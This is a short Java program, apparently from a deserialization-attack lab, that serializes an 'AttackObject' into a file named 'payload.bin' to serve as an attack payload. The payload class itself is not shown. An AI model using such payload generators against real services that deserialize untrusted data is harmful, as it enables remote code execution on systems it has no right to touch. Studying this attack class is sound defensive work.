import java.io.*;

public class GeneratePayload {

    public static void main(String[] args)
            throws Exception {

        AttackObject obj =
                new AttackObject();

        ObjectOutputStream out =
                new ObjectOutputStream(
                        new FileOutputStream(
                                "payload.bin"));

        out.writeObject(obj);

        out.close();

        System.out.println("Payload created");
    }
}